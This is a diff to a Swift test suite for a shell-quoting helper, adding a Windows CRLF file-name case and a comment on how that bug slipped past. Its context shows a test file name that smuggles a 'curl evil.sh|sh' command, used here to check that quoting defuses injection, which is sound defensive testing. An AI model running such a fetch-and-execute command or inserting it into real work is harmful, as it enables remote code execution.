@@ -89,8 +89,13 @@ struct ProjectRemediationQuotingTests {
         #expect(ShellQuoting.singleQuoted(injectionName) == "''\\'';curl evil.sh|sh;'\\''.env'")
     }
 
+    /// `"bad\r\nname.env"` is the case whose absence let the CRLF bug through:
+    /// `"\r\n"` is a single Swift `Character`, so a refusal written against the
+    /// `Character` `"\n"` does not see it, and a name broken by a Windows line
+    /// ending would have been quoted into a "single-line" command that in fact
+    /// spans two.
     @Test("a name containing a line break cannot be quoted at all",
-          arguments: ["bad\nname.env", "bad\rname.env", "trailing.env\n"])
+          arguments: ["bad\nname.env", "bad\rname.env", "bad\r\nname.env", "trailing.env\n"])
     func newlinesAreRefusedRatherThanEscaped(name: String) {
         #expect(ShellQuoting.singleQuoted(name) == nil)
     }
